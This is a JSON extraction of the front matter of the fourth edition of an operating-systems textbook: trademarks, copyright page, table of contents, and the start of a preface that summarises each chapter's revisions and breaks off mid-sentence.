{
  "Cover": {
    "page": 1,
    "content": "MODERN\r\nOPERATING SYSTEMS\r\nFOURTH EDITION\nTrademarks\r\nAMD, the AMD logo, and combinations thereof are trademarks of Advanced Micro Devices, Inc.\r\nAndroid and Google Web Search are trademarks of Google Inc.\r\nApple and Apple Macintosh are registered trademarkes of Apple Inc.\r\nASM, DESPOOL, DDT, LINK-80, MAC, MP/M, PL/1-80 and SID are trademarks of Digital\r\nResearch.\r\nBlackBerry®, RIM®, Research In Motion® and related trademarks, names and logos are the\r\nproperty of Research In Motion Limited and are registered and/or used in the U.S. and coun\u0002tries around the world.\r\nBlu-ray Disc™ is a trademark owned by Blu-ray Disc Association.\r\nCD Compact Disk is a trademark of Phillips.\r\nCDC 6600 is a trademark of Control Data Corporation.\r\nCP/M and CP/NET are registered trademarks of Digital Research.\r\nDEC and PDP are registered trademarks of Digital Equipment Corporation.\r\neCosCentric is the owner of the eCos Trademark and eCos Logo, in the US and other countries. The\r\nmarks were acquired from the Free Software Foundation on 26th February 2007. The Trademark and\r\nLogo were previously owned by Red Hat.\r\nThe GNOME logo and GNOME name are registered trademarks or trademarks of GNOME Foundation\r\nin the United States or other countries.\r\nFirefox® and Firefox® OS are registered trademarks of the Mozilla Foundation.\r\nFortran is a trademark of IBM Corp.\r\nFreeBSD is a registered trademark of the FreeBSD Foundation.\r\nGE 645 is a trademark of General Electric Corporation.\r\nIntel Core is a trademark of Intel Corporation in the U.S. and/or other countries.\r\nJava is a trademark of Sun Microsystems, Inc., and refers to Sun’s Java programming language.\r\nLinux® is the registered trademark of Linus Torvalds in the U.S. and other countries.\r\nMS-DOS and Windows are registered trademarks of Microsoft Corporation in the United States and/or\r\nother countries.\r\nTI Silent 700 is a trademark of Texas Instruments Incorporated.\r\nUNIX is a registered trademark of The Open Group.\r\nZilog and Z80 are registered trademarks of Zilog, Inc.\nMODERN\r\nOPERATING SYSTEMS\r\nFOURTH EDITION\r\nANDREW S. TANENBAUM\r\nHERBERT BOS\r\nVrije Universiteit\r\nAmsterdam, The Netherlands\r\nBoston Columbus Indianapolis New York San Francisco Upper Saddle River\r\nAmsterdam Cape Town Dubai London Madrid Milan Munich Paris Montréal Toronto\r\nDelhi Mexico City São Paulo Sydney Hong Kong Seoul Singapore Taipei Tokyo"
  },
  "Title Page": {
    "page": 4,
    "content": "MODERN\r\nOPERATING SYSTEMS\r\nFOURTH EDITION\r\nANDREW S. TANENBAUM\r\nHERBERT BOS\r\nVrije Universiteit\r\nAmsterdam, The Netherlands\r\nBoston Columbus Indianapolis New York San Francisco Upper Saddle River\r\nAmsterdam Cape Town Dubai London Madrid Milan Munich Paris Montréal Toronto\r\nDelhi Mexico City São Paulo Sydney Hong Kong Seoul Singapore Taipei Tokyo\nVice President and Editorial Director, ECS: Marcia Horton\r\nExecutive Editor: Tracy Johnson\r\nProgram Management Team Lead: Scott Disanno\r\nProgram Manager: Carole Snyder\r\nProject Manager: Camille Trentacoste\r\nOperations Specialist: Linda Sager\r\nCover Design: Black Horse Designs\r\nCover art: Jason Consalvo\r\nMedia Project Manager: Renata Butera\r\nCopyright © 2015, 2008 by Pearson Education, Inc., Upper Saddle River, New Jersey, 07458,\r\nPearson Prentice-Hall. All rights reserved. Printed in the United States of America. This publication\r\nis protected by Copyright and permission should be obtained from the publisher prior to any\r\nprohibited reproduction, storage in a retrieval system, or transmission in any form or by any\r\nmeans, electronic, mechanical, photocopying, recording, or likewise. For information regarding\r\npermission(s), write to: Rights and Permissions Department.\r\nPearson Prentice Hall™ is a trademark of Pearson Education, Inc.\r\nPearson® is a registered trademark of Pearson plc\r\nPrentice Hall® is a registered trademark of Pearson Education, Inc.\r\nLibrary of Congress Cataloging-in-Publication Data\r\nOn file\r\nISBN-10: 0-13-359162-X\r\nISBN-13: 978-0-13-359162-0"
  },
  "Copyright Page": {
    "page": 5,
    "content": "Vice President and Editorial Director, ECS: Marcia Horton\r\nExecutive Editor: Tracy Johnson\r\nProgram Management Team Lead: Scott Disanno\r\nProgram Manager: Carole Snyder\r\nProject Manager: Camille Trentacoste\r\nOperations Specialist: Linda Sager\r\nCover Design: Black Horse Designs\r\nCover art: Jason Consalvo\r\nMedia Project Manager: Renata Butera\r\nCopyright © 2015, 2008 by Pearson Education, Inc., Upper Saddle River, New Jersey, 07458,\r\nPearson Prentice-Hall. All rights reserved. Printed in the United States of America. This publication\r\nis protected by Copyright and permission should be obtained from the publisher prior to any\r\nprohibited reproduction, storage in a retrieval system, or transmission in any form or by any\r\nmeans, electronic, mechanical, photocopying, recording, or likewise. For information regarding\r\npermission(s), write to: Rights and Permissions Department.\r\nPearson Prentice Hall™ is a trademark of Pearson Education, Inc.\r\nPearson® is a registered trademark of Pearson plc\r\nPrentice Hall® is a registered trademark of Pearson Education, Inc.\r\nLibrary of Congress Cataloging-in-Publication Data\r\nOn file\r\nISBN-10: 0-13-359162-X\r\nISBN-13: 978-0-13-359162-0\nTo Suzanne, Barbara, Daniel, Aron, Nathan, Marvin, Matilde, and Olivia.\r\nThe list keeps growing. (AST)\r\nTo Marieke, Duko, Jip, and Spot. Fearsome Jedi, all. (HB)\nThis page intentionally left blank \nCONTENTS\r\nPREFACE xxiii\r\n1 INTRODUCTION 1\r\n1.1 WHAT IS AN OPERATING SYSTEM? 3\r\n1.1.1 The Operating System as an Extended Machine 4\r\n1.1.2 The Operating System as a Resource Manager 5\r\n1.2 HISTORY OF OPERATING SYSTEMS 6\r\n1.2.1 The First Generation (1945–55): Vacuum Tubes 7\r\n1.2.2 The Second Generation (1955–65): Transistors and Batch Systems 8\r\n1.2.3 The Third Generation (1965–1980): ICs and Multiprogramming 9\r\n1.2.4 The Fourth Generation (1980–Present): Personal Computers 14\r\n1.2.5 The Fifth Generation (1990–Present): Mobile Computers 19\r\n1.3 COMPUTER HARDWARE REVIEW 20\r\n1.3.1 Processors 21\r\n1.3.2 Memory 24\r\n1.3.3 Disks 27\r\n1.3.4 I/O Devices 28\r\n1.3.5 Buses 31\r\n1.3.6 Booting the Computer 34\r\nvii\nviii CONTENTS\r\n1.4 THE OPERATING SYSTEM ZOO 35\r\n1.4.1 Mainframe Operating Systems 35\r\n1.4.2 Server Operating Systems 35\r\n1.4.3 Multiprocessor Operating Systems 36\r\n1.4.4 Personal Computer Operating Systems 36\r\n1.4.5 Handheld Computer Operating Systems 36\r\n1.4.6 Embedded Operating Systems 36\r\n1.4.7 Sensor-Node Operating Systems 37\r\n1.4.8 Real-Time Operating Systems 37\r\n1.4.9 Smart Card Operating Systems 38\r\n1.5 OPERATING SYSTEM CONCEPTS 38\r\n1.5.1 Processes 39\r\n1.5.2 Address Spaces 41\r\n1.5.3 Files 41\r\n1.5.4 Input/Output 45\r\n1.5.5 Protection 45\r\n1.5.6 The Shell 45\r\n1.5.7 Ontogeny Recapitulates Phylogeny 46\r\n1.6 SYSTEM CALLS 50\r\n1.6.1 System Calls for Process Management 53\r\n1.6.2 System Calls for File Management 56\r\n1.6.3 System Calls for Directory Management 57\r\n1.6.4 Miscellaneous System Calls 59\r\n1.6.5 The Windows Win32 API 60\r\n1.7 OPERATING SYSTEM STRUCTURE 62\r\n1.7.1 Monolithic Systems 62\r\n1.7.2 Layered Systems 63\r\n1.7.3 Microkernels 65\r\n1.7.4 Client-Server Model 68\r\n1.7.5 Virtual Machines 68\r\n1.7.6 Exokernels 72\r\n1.8 THE WORLD ACCORDING TO C 73\r\n1.8.1 The C Language 73\r\n1.8.2 Header Files 74\r\n1.8.3 Large Programming Projects 75\r\n1.8.4 The Model of Run Time 76\nCONTENTS ix\r\n1.9 RESEARCH ON OPERATING SYSTEMS 77\r\n1.10 OUTLINE OF THE REST OF THIS BOOK 78\r\n1.11 METRIC UNITS 79\r\n1.12 SUMMARY 80\r\n2 PROCESSES AND THREADS 85\r\n2.1 PROCESSES 85\r\n2.1.1 The Process Model 86\r\n2.1.2 Process Creation 88\r\n2.1.3 Process Termination 90\r\n2.1.4 Process Hierarchies 91\r\n2.1.5 Process States 92\r\n2.1.6 Implementation of Processes 94\r\n2.1.7 Modeling Multiprogramming 95\r\n2.2 THREADS 97\r\n2.2.1 Thread Usage 97\r\n2.2.2 The Classical Thread Model 102\r\n2.2.3 POSIX Threads 106\r\n2.2.4 Implementing Threads in User Space 108\r\n2.2.5 Implementing Threads in the Kernel 111\r\n2.2.6 Hybrid Implementations 112\r\n2.2.7 Scheduler Activations 113\r\n2.2.8 Pop-Up Threads 114\r\n2.2.9 Making Single-Threaded Code Multithreaded 115\r\n2.3 INTERPROCESS COMMUNICATION 119\r\n2.3.1 Race Conditions 119\r\n2.3.2 Critical Regions 121\r\n2.3.3 Mutual Exclusion with Busy Waiting 121\r\n2.3.4 Sleep and Wakeup 127\r\n2.3.5 Semaphores 130\r\n2.3.6 Mutexes 132\nx CONTENTS\r\n2.3.7 Monitors 137\r\n2.3.8 Message Passing 144\r\n2.3.9 Barriers 146\r\n2.3.10 Avoiding Locks: Read-Copy-Update 148\r\n2.4 SCHEDULING 148\r\n2.4.1 Introduction to Scheduling 149\r\n2.4.2 Scheduling in Batch Systems 156\r\n2.4.3 Scheduling in Interactive Systems 158\r\n2.4.4 Scheduling in Real-Time Systems 164\r\n2.4.5 Policy Versus Mechanism 165\r\n2.4.6 Thread Scheduling 165\r\n2.5 CLASSICAL IPC PROBLEMS 167\r\n2.5.1 The Dining Philosophers Problem 167\r\n2.5.2 The Readers and Writers Problem 169\r\n2.6 RESEARCH ON PROCESSES AND THREADS 172\r\n2.7 SUMMARY 173\r\n3 MEMORY MANAGEMENT 181\r\n3.1 NO MEMORY ABSTRACTION 182\r\n3.2 A MEMORY ABSTRACTION: ADDRESS SPACES 185\r\n3.2.1 The Notion of an Address Space 185\r\n3.2.2 Swapping 187\r\n3.2.3 Managing Free Memory 190\r\n3.3 VIRTUAL MEMORY 194\r\n3.3.1 Paging 195\r\n3.3.2 Page Tables 198\r\n3.3.3 Speeding Up Paging 201\r\n3.3.4 Page Tables for Large Memories 205\nCONTENTS xi\r\n3.4 PAGE REPLACEMENT ALGORITHMS 209\r\n3.4.1 The Optimal Page Replacement Algorithm 209\r\n3.4.2 The Not Recently Used Page Replacement Algorithm 210\r\n3.4.3 The First-In, First-Out (FIFO) Page Replacement Algorithm 211\r\n3.4.4 The Second-Chance Page Replacement Algorithm 211\r\n3.4.5 The Clock Page Replacement Algorithm 212\r\n3.4.6 The Least Recently Used (LRU) Page Replacement Algorithm 213\r\n3.4.7 Simulating LRU in Software 214\r\n3.4.8 The Working Set Page Replacement Algorithm 215\r\n3.4.9 The WSClock Page Replacement Algorithm 219\r\n3.4.10 Summary of Page Replacement Algorithms 221\r\n3.5 DESIGN ISSUES FOR PAGING SYSTEMS 222\r\n3.5.1 Local versus Global Allocation Policies 222\r\n3.5.2 Load Control 225\r\n3.5.3 Page Size 225\r\n3.5.4 Separate Instruction and Data Spaces 227\r\n3.5.5 Shared Pages 228\r\n3.5.6 Shared Libraries 229\r\n3.5.7 Mapped Files 231\r\n3.5.8 Cleaning Policy 232\r\n3.5.9 Virtual Memory Interface 232\r\n3.6 IMPLEMENTATION ISSUES 233\r\n3.6.1 Operating System Involvement with Paging 233\r\n3.6.2 Page Fault Handling 234\r\n3.6.3 Instruction Backup 235\r\n3.6.4 Locking Pages in Memory 236\r\n3.6.5 Backing Store 237\r\n3.6.6 Separation of Policy and Mechanism 239\r\n3.7 SEGMENTATION 240\r\n3.7.1 Implementation of Pure Segmentation 243\r\n3.7.2 Segmentation with Paging: MULTICS 243\r\n3.7.3 Segmentation with Paging: The Intel x86 247\r\n3.8 RESEARCH ON MEMORY MANAGEMENT 252\r\n3.9 SUMMARY 253\nxii CONTENTS\r\n4 FILE SYSTEMS 263\r\n4.1 FILES 265\r\n4.1.1 File Naming 265\r\n4.1.2 File Structure 267\r\n4.1.3 File Types 268\r\n4.1.4 File Access 269\r\n4.1.5 File Attributes 271\r\n4.1.6 File Operations 271\r\n4.1.7 An Example Program Using File-System Calls 273\r\n4.2 DIRECTORIES 276\r\n4.2.1 Single-Level Directory Systems 276\r\n4.2.2 Hierarchical Directory Systems 276\r\n4.2.3 Path Names 277\r\n4.2.4 Directory Operations 280\r\n4.3 FILE-SYSTEM IMPLEMENTATION 281\r\n4.3.1 File-System Layout 281\r\n4.3.2 Implementing Files 282\r\n4.3.3 Implementing Directories 287\r\n4.3.4 Shared Files 290\r\n4.3.5 Log-Structured File Systems 293\r\n4.3.6 Journaling File Systems 294\r\n4.3.7 Virtual File Systems 296\r\n4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 299\r\n4.4.1 Disk-Space Management 299\r\n4.4.2 File-System Backups 306\r\n4.4.3 File-System Consistency 312\r\n4.4.4 File-System Performance 314\r\n4.4.5 Defragmenting Disks 319\r\n4.5 EXAMPLE FILE SYSTEMS 320\r\n4.5.1 The MS-DOS File System 320\r\n4.5.2 The UNIX V7 File System 323\r\n4.5.3 CD-ROM File Systems 325\r\n4.6 RESEARCH ON FILE SYSTEMS 331\r\n4.7 SUMMARY 332\nCONTENTS xiii\r\n5 INPUT/OUTPUT 337\r\n5.1 PRINCIPLES OF I/O HARDWARE 337\r\n5.1.1 I/O Devices 338\r\n5.1.2 Device Controllers 339\r\n5.1.3 Memory-Mapped I/O 340\r\n5.1.4 Direct Memory Access 344\r\n5.1.5 Interrupts Revisited 347\r\n5.2 PRINCIPLES OF I/O SOFTWARE 351\r\n5.2.1 Goals of the I/O Software 351\r\n5.2.2 Programmed I/O 352\r\n5.2.3 Interrupt-Driven I/O 354\r\n5.2.4 I/O Using DMA 355\r\n5.3 I/O SOFTWARE LAYERS 356\r\n5.3.1 Interrupt Handlers 356\r\n5.3.2 Device Drivers 357\r\n5.3.3 Device-Independent I/O Software 361\r\n5.3.4 User-Space I/O Software 367\r\n5.4 DISKS 369\r\n5.4.1 Disk Hardware 369\r\n5.4.2 Disk Formatting 375\r\n5.4.3 Disk Arm Scheduling Algorithms 379\r\n5.4.4 Error Handling 382\r\n5.4.5 Stable Storage 385\r\n5.5 CLOCKS 388\r\n5.5.1 Clock Hardware 388\r\n5.5.2 Clock Software 389\r\n5.5.3 Soft Timers 392\r\n5.6 USER INTERFACES: KEYBOARD, MOUSE, MONITOR 394\r\n5.6.1 Input Software 394\r\n5.6.2 Output Software 399\r\n5.7 THIN CLIENTS 416\r\n5.8 POWER MANAGEMENT 417\r\n5.8.1 Hardware Issues 418\nxiv CONTENTS\r\n5.8.2 Operating System Issues 419\r\n5.8.3 Application Program Issues 425\r\n5.9 RESEARCH ON INPUT/OUTPUT 426\r\n5.10 SUMMARY 428\r\n6 DEADLOCKS 435\r\n6.1 RESOURCES 436\r\n6.1.1 Preemptable and Nonpreemptable Resources 436\r\n6.1.2 Resource Acquisition 437\r\n6.2 INTRODUCTION TO DEADLOCKS 438\r\n6.2.1 Conditions for Resource Deadlocks 439\r\n6.2.2 Deadlock Modeling 440\r\n6.3 THE OSTRICH ALGORITHM 443\r\n6.4 DEADLOCK DETECTION AND RECOVERY 443\r\n6.4.1 Deadlock Detection with One Resource of Each Type 444\r\n6.4.2 Deadlock Detection with Multiple Resources of Each Type 446\r\n6.4.3 Recovery from Deadlock 448\r\n6.5 DEADLOCK AV OIDANCE 450\r\n6.5.1 Resource Trajectories 450\r\n6.5.2 Safe and Unsafe States 452\r\n6.5.3 The Banker’s Algorithm for a Single Resource 453\r\n6.5.4 The Banker’s Algorithm for Multiple Resources 454\r\n6.6 DEADLOCK PREVENTION 456\r\n6.6.1 Attacking the Mutual-Exclusion Condition 456\r\n6.6.2 Attacking the Hold-and-Wait Condition 456\r\n6.6.3 Attacking the No-Preemption Condition 457\r\n6.6.4 Attacking the Circular Wait Condition 457\r\n6.7 OTHER ISSUES 458\r\n6.7.1 Two-Phase Locking 458\r\n6.7.2 Communication Deadlocks 459\nCONTENTS xv\r\n6.7.3 Livelock 461\r\n6.7.4 Starvation 463\r\n6.8 RESEARCH ON DEADLOCKS 464\r\n6.9 SUMMARY 464\r\n7 VIRTUALIZATION AND THE CLOUD 471\r\n7.1 HISTORY 473\r\n7.2 REQUIREMENTS FOR VIRTUALIZATION 474\r\n7.3 TYPE 1 AND TYPE 2 HYPERVISORS 477\r\n7.4 TECHNIQUES FOR EFFICIENT VIRTUALIZATION 478\r\n7.4.1 Virtualizing the Unvirtualizable 479\r\n7.4.2 The Cost of Virtualization 482\r\n7.5 ARE HYPERVISORS MICROKERNELS DONE RIGHT? 483\r\n7.6 MEMORY VIRTUALIZATION 486\r\n7.7 I/O VIRTUALIZATION 490\r\n7.8 VIRTUAL APPLIANCES 493\r\n7.9 VIRTUAL MACHINES ON MULTICORE CPUS 494\r\n7.10 LICENSING ISSUES 494\r\n7.11 CLOUDS 495\r\n7.11.1 Clouds as a Service 496\r\n7.11.2 Virtual Machine Migration 496\r\n7.11.3 Checkpointing 497\r\n7.12 CASE STUDY: VMWARE 498\r\n7.12.1 The Early History of VMware 498\r\n7.12.2 VMware Workstation 499\nxvi CONTENTS\r\n7.12.3 Challenges in Bringing Virtualization to the x86 500\r\n7.12.4 VMware Workstation: Solution Overview 502\r\n7.12.5 The Evolution of VMware Workstation 511\r\n7.12.6 ESX Server: VMware’s type 1 Hypervisor 512\r\n7.13 RESEARCH ON VIRTUALIZATION AND THE CLOUD 514\r\n8 MULTIPLE PROCESSOR SYSTEMS 517\r\n8.1 MULTIPROCESSORS 520\r\n8.1.1 Multiprocessor Hardware 520\r\n8.1.2 Multiprocessor Operating System Types 530\r\n8.1.3 Multiprocessor Synchronization 534\r\n8.1.4 Multiprocessor Scheduling 539\r\n8.2 MULTICOMPUTERS 544\r\n8.2.1 Multicomputer Hardware 545\r\n8.2.2 Low-Level Communication Software 550\r\n8.2.3 User-Level Communication Software 552\r\n8.2.4 Remote Procedure Call 556\r\n8.2.5 Distributed Shared Memory 558\r\n8.2.6 Multicomputer Scheduling 563\r\n8.2.7 Load Balancing 563\r\n8.3 DISTRIBUTED SYSTEMS 566\r\n8.3.1 Network Hardware 568\r\n8.3.2 Network Services and Protocols 571\r\n8.3.3 Document-Based Middleware 576\r\n8.3.4 File-System-Based Middleware 577\r\n8.3.5 Object-Based Middleware 582\r\n8.3.6 Coordination-Based Middleware 584\r\n8.4 RESEARCH ON MULTIPLE PROCESSOR SYSTEMS 587\r\n8.5 SUMMARY 588\nCONTENTS xvii\r\n9 SECURITY 593\r\n9.1 THE SECURITY ENVIRONMENT 595\r\n9.1.1 Threats 596\r\n9.1.2 Attackers 598\r\n9.2 OPERATING SYSTEMS SECURITY 599\r\n9.2.1 Can We Build Secure Systems? 600\r\n9.2.2 Trusted Computing Base 601\r\n9.3 CONTROLLING ACCESS TO RESOURCES 602\r\n9.3.1 Protection Domains 602\r\n9.3.2 Access Control Lists 605\r\n9.3.3 Capabilities 608\r\n9.4 FORMAL MODELS OF SECURE SYSTEMS 611\r\n9.4.1 Multilevel Security 612\r\n9.4.2 Covert Channels 615\r\n9.5 BASICS OF CRYPTOGRAPHY 619\r\n9.5.1 Secret-Key Cryptography 620\r\n9.5.2 Public-Key Cryptography 621\r\n9.5.3 One-Way Functions 622\r\n9.5.4 Digital Signatures 622\r\n9.5.5 Trusted Platform Modules 624\r\n9.6 AUTHENTICATION 626\r\n9.6.1 Authentication Using a Physical Object 633\r\n9.6.2 Authentication Using Biometrics 636\r\n9.7 EXPLOITING SOFTWARE 639\r\n9.7.1 Buffer Overflow Attacks 640\r\n9.7.2 Format String Attacks 649\r\n9.7.3 Dangling Pointers 652\r\n9.7.4 Null Pointer Dereference Attacks 653\r\n9.7.5 Integer Overflow Attacks 654\r\n9.7.6 Command Injection Attacks 655\r\n9.7.7 Time of Check to Time of Use Attacks 656\r\n9.8 INSIDER ATTA CKS 657\r\n9.8.1 Logic Bombs 657\r\n9.8.2 Back Doors 658\r\n9.8.3 Login Spoofing 659\nxviii CONTENTS\r\n9.9 MALWARE 660\r\n9.9.1 Trojan Horses 662\r\n9.9.2 Viruses 664\r\n9.9.3 Worms 674\r\n9.9.4 Spyware 676\r\n9.9.5 Rootkits 680\r\n9.10 DEFENSES 684\r\n9.10.1 Firewalls 685\r\n9.10.2 Antivirus and Anti-Antivirus Techniques 687\r\n9.10.3 Code Signing 693\r\n9.10.4 Jailing 694\r\n9.10.5 Model-Based Intrusion Detection 695\r\n9.10.6 Encapsulating Mobile Code 697\r\n9.10.7 Java Security 701\r\n9.11 RESEARCH ON SECURITY 703\r\n9.12 SUMMARY 704\r\n10 CASE STUDY 1: UNIX, LINUX, AND ANDROID 713\r\n10.1 HISTORY OF UNIX AND LINUX 714\r\n10.1.1 UNICS 714\r\n10.1.2 PDP-11 UNIX 715\r\n10.1.3 Portable UNIX 716\r\n10.1.4 Berkeley UNIX 717\r\n10.1.5 Standard UNIX 718\r\n10.1.6 MINIX 719\r\n10.1.7 Linux 720\r\n10.2 OVERVIEW OF LINUX 723\r\n10.2.1 Linux Goals 723\r\n10.2.2 Interfaces to Linux 724\r\n10.2.3 The Shell 725\r\n10.2.4 Linux Utility Programs 728\r\n10.2.5 Kernel Structure 730\r\n10.3 PROCESSES IN LINUX 733\r\n10.3.1 Fundamental Concepts 733\r\n10.3.2 Process-Management System Calls in Linux 735\nCONTENTS xix\r\n10.3.3 Implementation of Processes and Threads in Linux 739\r\n10.3.4 Scheduling in Linux 746\r\n10.3.5 Booting Linux 751\r\n10.4 MEMORY MANAGEMENT IN LINUX 753\r\n10.4.1 Fundamental Concepts 753\r\n10.4.2 Memory Management System Calls in Linux 756\r\n10.4.3 Implementation of Memory Management in Linux 758\r\n10.4.4 Paging in Linux 764\r\n10.5 INPUT/OUTPUT IN LINUX 767\r\n10.5.1 Fundamental Concepts 767\r\n10.5.2 Networking 769\r\n10.5.3 Input/Output System Calls in Linux 770\r\n10.5.4 Implementation of Input/Output in Linux 771\r\n10.5.5 Modules in Linux 774\r\n10.6 THE LINUX FILE SYSTEM 775\r\n10.6.1 Fundamental Concepts 775\r\n10.6.2 File-System Calls in Linux 780\r\n10.6.3 Implementation of the Linux File System 783\r\n10.6.4 NFS: The Network File System 792\r\n10.7 SECURITY IN LINUX 798\r\n10.7.1 Fundamental Concepts 798\r\n10.7.2 Security System Calls in Linux 800\r\n10.7.3 Implementation of Security in Linux 801\r\n10.8 ANDROID 802\r\n10.8.1 Android and Google 803\r\n10.8.2 History of Android 803\r\n10.8.3 Design Goals 807\r\n10.8.4 Android Architecture 809\r\n10.8.5 Linux Extensions 810\r\n10.8.6 Dalvik 814\r\n10.8.7 Binder IPC 815\r\n10.8.8 Android Applications 824\r\n10.8.9 Intents 836\r\n10.8.10 Application Sandboxes 837\r\n10.8.11 Security 838\r\n10.8.12 Process Model 844\r\n10.9 SUMMARY 848\nxx CONTENTS\r\n11 CASE STUDY 2: WINDOWS 8 857\r\n11.1 HISTORY OF WINDOWS THROUGH WINDOWS 8.1 857\r\n11.1.1 1980s: MS-DOS 857\r\n11.1.2 1990s: MS-DOS-based Windows 859\r\n11.1.3 2000s: NT-based Windows 859\r\n11.1.4 Windows Vista 862\r\n11.1.5 2010s: Modern Windows 863\r\n11.2 PROGRAMMING WINDOWS 864\r\n11.2.1 The Native NT Application Programming Interface 867\r\n11.2.2 The Win32 Application Programming Interface 871\r\n11.2.3 The Windows Registry 875\r\n11.3 SYSTEM STRUCTURE 877\r\n11.3.1 Operating System Structure 877\r\n11.3.2 Booting Windows 893\r\n11.3.3 Implementation of the Object Manager 894\r\n11.3.4 Subsystems, DLLs, and User-Mode Services 905\r\n11.4 PROCESSES AND THREADS IN WINDOWS 908\r\n11.4.1 Fundamental Concepts 908\r\n11.4.2 Job, Process, Thread, and Fiber Management API Calls 914\r\n11.4.3 Implementation of Processes and Threads 919\r\n11.5 MEMORY MANAGEMENT 927\r\n11.5.1 Fundamental Concepts 927\r\n11.5.2 Memory-Management System Calls 931\r\n11.5.3 Implementation of Memory Management 932\r\n11.6 CACHING IN WINDOWS 942\r\n11.7 INPUT/OUTPUT IN WINDOWS 943\r\n11.7.1 Fundamental Concepts 944\r\n11.7.2 Input/Output API Calls 945\r\n11.7.3 Implementation of I/O 948\r\n11.8 THE WINDOWS NT FILE SYSTEM 952\r\n11.8.1 Fundamental Concepts 953\r\n11.8.2 Implementation of the NT File System 954\r\n11.9 WINDOWS POWER MANAGEMENT 964\nCONTENTS xxi\r\n11.10 SECURITY IN WINDOWS 8 966\r\n11.10.1 Fundamental Concepts 967\r\n11.10.2 Security API Calls 969\r\n11.10.3 Implementation of Security 970\r\n11.10.4 Security Mitigations 972\r\n11.11 SUMMARY 975\r\n12 OPERATING SYSTEM DESIGN 981\r\n12.1 THE NATURE OF THE DESIGN PROBLEM 982\r\n12.1.1 Goals 982\r\n12.1.2 Why Is It Hard to Design an Operating System? 983\r\n12.2 INTERFACE DESIGN 985\r\n12.2.1 Guiding Principles 985\r\n12.2.2 Paradigms 987\r\n12.2.3 The System-Call Interface 991\r\n12.3 IMPLEMENTATION 993\r\n12.3.1 System Structure 993\r\n12.3.2 Mechanism vs. Policy 997\r\n12.3.3 Orthogonality 998\r\n12.3.4 Naming 999\r\n12.3.5 Binding Time 1001\r\n12.3.6 Static vs. Dynamic Structures 1001\r\n12.3.7 Top-Down vs. Bottom-Up Implementation 1003\r\n12.3.8 Synchronous vs. Asynchronous Communication 1004\r\n12.3.9 Useful Techniques 1005\r\n12.4 PERFORMANCE 1010\r\n12.4.1 Why Are Operating Systems Slow? 1010\r\n12.4.2 What Should Be Optimized? 1011\r\n12.4.3 Space-Time Trade-offs 1012\r\n12.4.4 Caching 1015\r\n12.4.5 Hints 1016\r\n12.4.6 Exploiting Locality 1016\r\n12.4.7 Optimize the Common Case 1017\nxxii CONTENTS\r\n12.5 PROJECT MANAGEMENT 1018\r\n12.5.1 The Mythical Man Month 1018\r\n12.5.2 Team Structure 1019\r\n12.5.3 The Role of Experience 1021\r\n12.5.4 No Silver Bullet 1021\r\n12.6 TRENDS IN OPERATING SYSTEM DESIGN 1022\r\n12.6.1 Virtualization and the Cloud 1023\r\n12.6.2 Manycore Chips 1023\r\n12.6.3 Large-Address-Space Operating Systems 1024\r\n12.6.4 Seamless Data Access 1025\r\n12.6.5 Battery-Powered Computers 1025\r\n12.6.6 Embedded Systems 1026\r\n12.7 SUMMARY 1027\r\n13 READING LIST AND BIBLIOGRAPHY 1031\r\n13.1 SUGGESTIONS FOR FURTHER READING 1031\r\n13.1.1 Introduction 1031\r\n13.1.2 Processes and Threads 1032\r\n13.1.3 Memory Management 1033\r\n13.1.4 File Systems 1033\r\n13.1.5 Input/Output 1034\r\n13.1.6 Deadlocks 1035\r\n13.1.7 Virtualization and the Cloud 1035\r\n13.1.8 Multiple Processor Systems 1036\r\n13.1.9 Security 1037\r\n13.1.10 Case Study 1: UNIX, Linux, and Android 1039\r\n13.1.11 Case Study 2: Windows 8 1040\r\n13.1.12 Operating System Design 1040\r\n13.2 ALPHABETICAL BIBLIOGRAPHY 1041\r\nINDEX 1071\nPREFACE\r\nThe fourth edition of this book differs from the third edition in numerous ways.\r\nThere are large numbers of small changes everywhere to bring the material up to\r\ndate as operating systems are not standing still. The chapter on Multimedia Oper\u0002ating Systems has been moved to the Web, primarily to make room for new mater\u0002ial and keep the book from growing to a completely unmanageable size. The chap\u0002ter on Windows Vista has been removed completely as Vista has not been the suc\u0002cess Microsoft hoped for. The chapter on Symbian has also been removed, as\r\nSymbian no longer is widely available. However, the Vista material has been re\u0002placed by Windows 8 and Symbian has been replaced by Android. Also, a com\u0002pletely new chapter, on virtualization and the cloud has been added. Here is a\r\nchapter-by-chapter rundown of the changes.\r\n• Chapter 1 has been heavily modified and updated in many places but\r\nwith the exception of a new section on mobile computers, no major\r\nsections have been added or deleted.\r\n• Chapter 2 has been updated, with older material removed and some\r\nnew material added. For example, we added the futex synchronization\r\nprimitive, and a section about how to avoid locking altogether with\r\nRead-Copy-Update.\r\n• Chapter 3 now has more focus on modern hardware and less emphasis\r\non segmentation and MULTICS.\r\n• In Chapter 4 we removed CD-Roms, as they are no longer very com\u0002mon, and replaced them with more modern solutions (like flash\r\ndrives). Also, we added RAID level 6 to the section on RAID.\r\nxxiii\nxxiv PREFACE\r\n• Chapter 5 has seen a lot of changes. Older devices like CRTs and CD\u0002ROMs have been removed, while new technology, such as touch\r\nscreens have been added.\r\n• Chapter 6 is pretty much unchanged. The topic of deadlocks is fairly\r\nstable, with few new results.\r\n• Chapter 7 is completely new. It covers the important topics of virtu\u0002alization and the cloud. As a case study, a section on VMware has\r\nbeen added.\r\n• Chapter 8 is an updated version of the previous material on multiproc\u0002essor systems. There is more emphasis on multicore and manycore\r\nsystems now, which have become increasingly important in the past\r\nfew years. Cache consistency has become a bigger issue recently and\r\nis covered here, now.\r\n• Chapter 9 has been heavily revised and reorganized, with considerable\r\nnew material on exploiting code bugs, malware, and defenses against\r\nthem. Attacks such as null pointer dereferences and buffer overflows\r\nare treated in more detail. Defense mechanisms, including canaries,\r\nthe NX bit, and address-space randomization are covered in detail\r\nnow, as are the ways attackers try to defeat them.\r\n• Chapter 10 has undergone a major change. The material on UNIX and\r\nLinux has been updated but the major addtion here is a new and\r\nlengthy section on the Android operating system, which is very com\u0002mon on smartphones and tablets.\r\n• Chapter 11 in the third edition was on Windows Vista. That has been\r\nreplaced by a chapter on Windows 8, specifically Windows 8.1. It\r\nbrings the treatment of Windows completely up to date.\r\n• Chapter 12 is a revised version of Chap. 13 from the previous edition.\r\n• Chapter 13 is a thoroughly updated list of suggested readings. In addi\u0002tion, the list of references has been updated, with entries to 223 new\r\nworks published after the third edition of this book came out.\r\n• Chapter 7 from the previous edition has been moved to the book’s\r\nWebsite to keep the size somewhat manageable).\r\n• In addition, the sections on research throughout the book have 